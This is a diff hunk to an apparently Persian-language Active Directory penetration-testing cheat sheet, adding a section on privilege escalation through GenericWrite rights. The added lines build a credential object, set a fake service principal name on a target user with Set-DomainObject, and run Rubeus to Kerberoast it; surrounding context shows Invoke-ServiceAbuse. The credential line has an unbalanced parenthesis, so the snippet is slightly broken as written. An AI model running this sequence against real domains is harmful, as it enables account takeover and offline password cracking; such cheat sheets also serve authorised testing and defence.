@@ -521,6 +521,16 @@ Enter-PSSession -ComputerName COMPUTERNAME -Credential “”
 Invoke-ServiceAbuse -Name ‘browser’ -UserName ‘domain\user1’
 ```
 
+### ارتقا دسترسی با دسترسی GenericWrite
+
+```text
+$pass = ConvertTo-SecureString 'Password123#' -AsPlainText -Force
+$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\MASTER USER'), $pass)
+Set-DomainObject -Credential $creds USER1 -Clear serviceprincipalname
+Set-DomainObject -Credential $creds -Identity USER1 -SET @{serviceprincipalname='none/fluu'}
+.\Rubeus.exe kerberoast /domain:<DOMAIN>
+```
+
 ### ارتقا دسترسی با استفاده از سرویس Sql و ActiveSessions
 
 ```text
